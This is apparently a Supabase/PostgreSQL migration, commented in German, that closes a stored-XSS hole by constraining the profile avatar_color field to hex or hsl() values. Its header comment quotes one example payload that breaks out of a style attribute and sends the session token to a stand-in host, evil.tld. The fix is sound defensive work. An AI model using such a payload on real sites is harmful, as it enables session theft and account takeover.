-- ══════════════════════════════════════════════════════════════════
--  A5 — Stored XSS in der Community schliessen (DB-Seite)
--  (Audit-Befunde 4.1 / 4.2, Backlog #10, #11)
--
--  Der Client escaped inzwischen selbst (AVATAR_COLOR_RE in
--  src/js/community.js) — das hier ist der zweite Riegel: profiles_update
--  laesst jeden seine eigene Zeile direkt ueber die REST-API schreiben,
--  vorbei am UI. avatar_color landet in einem style-Attribut; ein Wert wie
--    red" onmouseover="fetch('//evil.tld?'+localStorage.getItem('sb-…'))
--  braeche dort aus dem Attribut aus. Session liegt per persistSession im
--  localStorage — Codeausfuehrung hier heisst Kontouebernahme.
--
--  Erlaubt ist genau, was die App schreibt: das Leerzeichen-hsl() aus
--  AVATAR_PALETTE/colorFor() — plus Hex. Muster identisch zu AVATAR_COLOR_RE.
-- ══════════════════════════════════════════════════════════════════

-- NOT VALID: bestehende Zeilen werden NICHT geprueft, neue und geaenderte
-- schon. Damit kann diese Migration nicht an Altbestand scheitern.
-- Scharf gestellt wird sie in 20260830131000_a15_constraints_validieren.sql,
-- nachdem der Pruef-SELECT (siehe dort) leer zurueckkommt.
--
-- Der DO-Block statt DROP+ADD: existiert das Constraint schon und ist
-- bereits validiert, wuerde ein DROP+ADD NOT VALID es wieder entschaerfen.
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_constraint
    WHERE conname = 'avatar_color_fmt' AND conrelid = 'public.profiles'::regclass
  ) THEN
    ALTER TABLE public.profiles ADD CONSTRAINT avatar_color_fmt
      CHECK (avatar_color IS NULL OR avatar_color ~* '^(#([0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})|hsl\([0-9]{1,3}(\.[0-9]+)?[[:space:]]+[0-9]{1,3}(\.[0-9]+)?%[[:space:]]+[0-9]{1,3}(\.[0-9]+)?%\))$')
      NOT VALID;
  END IF;
END $$;
